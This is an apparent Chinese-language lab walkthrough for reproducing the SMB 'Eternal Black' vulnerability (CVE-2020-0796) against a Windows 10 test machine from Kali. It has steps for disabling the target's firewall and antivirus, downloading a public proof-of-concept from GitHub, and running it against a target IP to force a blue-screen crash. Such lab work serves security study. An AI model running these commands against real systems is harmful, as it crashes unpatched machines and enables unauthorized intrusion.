永恒之黑漏洞复现

​ 2020年3月，微软公布SMB远程代码执行漏洞（CVE-2020-0796）又称“永恒之黑”，该漏洞由SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，没有检查长度是否合法，最终导致整数溢出，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码，攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。
参考链接：https://www.yuque.com/wangx1aoer/qfn3xp/kedge6c7tcms3mop?singleDoc#

https://blog.csdn.net/weixin_63610715/article/details/133847253

1.关闭被攻击机防火墙（攻击机与被攻击机需在同一网段）

关闭实时防护：widows设置-更新与安全-windows安全中心-病毒和威胁防护

2.检测互联

确保攻击机与被攻击机win10可以互联通网，使用kali和win10互相ping。

ping成功界面

3.验证漏洞

脚本路径：D:\AAAAApeixun\永恒之黑python脚本

本机文件自带环境

工具下载地址：https://github.com/eerykitty/CVE-2020-0796-PoC

将工具下载后拖至kali中进行解压，进行蓝屏测试。（也可在物理机解压后移入kali机）

kali终端依次执行以下命令

unzip CVE-2020-0796-PoC-master.zip

cd CVE-2020-0796-PoC-master

python CVE-2020-0796.py 靶机IP地址（或输入./CVE-2020-0796.py 靶机IP地址）

如果出现以下情况，使用以下命令进行安装。

pip install ntlm_auth

kali输入攻击命令运行

靶机状态：崩溃蓝屏，强制重启，永恒之黑漏洞复现成功！
